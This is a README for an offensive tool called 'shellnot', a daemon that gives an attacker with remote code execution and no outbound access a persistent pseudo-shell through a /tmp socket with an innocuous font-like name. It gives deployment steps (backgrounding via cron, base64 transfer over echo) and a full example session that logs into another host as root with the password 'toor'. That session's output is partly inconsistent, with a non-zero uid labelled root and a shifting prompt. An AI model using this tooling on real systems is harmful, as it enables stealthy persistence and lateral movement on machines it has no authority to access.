# shellnot

## What is this, and when do I use it?

`shellnot` is a UNIX socket-based daemon for situations where you have **RCE** but no egress - you can execute code, but you can’t exfiltrate or pop a reverse shell.

It gives you a **persistent, interactive shell** by tunneling commands through a local client to a background daemon via `/tmp` sockets. You’re not getting a bind shell or reverse shell; you’re getting a best-effort pseudo-shell that lives on the box, keeps context, and answers only when you ask.

Use it when:

- You have RCE but no shell.
- You can write to disk and run local binaries.
- Outbound connections are blocked.
- You want stateful interaction (e.g., cd, ssh, history).
- You're done injecting chains of single-use commands.

This is built for low-priv, egress-restricted, post-exploitation environments where most payloads are fire-and-forget. Drop the daemon once, then talk to it via local execution. That’s it.

## How it works

There are two parts:

1. **Daemon (`--daemon`)**  
   This runs locally and manages multiple persistent pseudo-terminal (PTY) shell sessions, each tied to a session ID. It listens over a UNIX socket (`/tmp/koreanfont.sock` by default).

2. **Client**  
   You trigger this over your RCE context. It writes to the socket and optionally reads back:
   - `--input "<command>"` → sends a command to a session
   - `--output` → reads the output buffer from that session

The client can be executed repeatedly from your RCE to simulate an interactive shell, one command at a time. The daemon keeps session state, history, and PTY context.

---

## Example usage

Once the binary is on the box, start the daemon:
```sh
./shellnot --daemon & 
```
*Or use any means to background the process like  cron, etc...*

Continuing the RCE context, send a command to session 1:

```sh
./shellnot --session 1 --input "ssh root@1.domain.com"
```

Fetch the output from session 1:

```sh
./shellnot --session 1 --output
```

Full flow:

```sh
./shellnot --daemon &
./shellnot --session 1 --input "ssh root@2.domain.com"
./shellnot --session 1 --output
ssh root@2.domain.com

root@2.domain.com”s password:
./shellnot --session 1 --input "toor"
./shellnot --session 1 --output

Last login: Sat May 24 16:45:40 2025 from 10.0.0.2
[root@localhost ~]$ ⏎ 
./shellnot --session 1 --input "id"
./shellnot --session 1 --output
id
uid=1001(root) gid=1001(root) groups=1001(root),970(docker),998(wheel)
[risk@localhost ~]$
[risk@localhost ~]$ ⏎ 
./shellnot --session 1 --input "exit"
./shellnot --session 1 --output
exit
logout
Connection to 2.domain.com closed.
$ ⏎
```
```
ps aux | grep shellnot
mcrn        5770  0.0  0.0   2772   956 pts/0    S    22:33   0:00 ./shellnot --daemon
```

# Caveats
- Means to background the process, or at least two RCE instances.
- Might require to compile the binary on the box itself.
- Only works on UNIX-like systems with forkpty() support.

---

*Ignore the warning, made it to be as small as possible for base64 transfer over `echo` with RCE.*
```sh
gcc shellnot.c -o shellnot
```
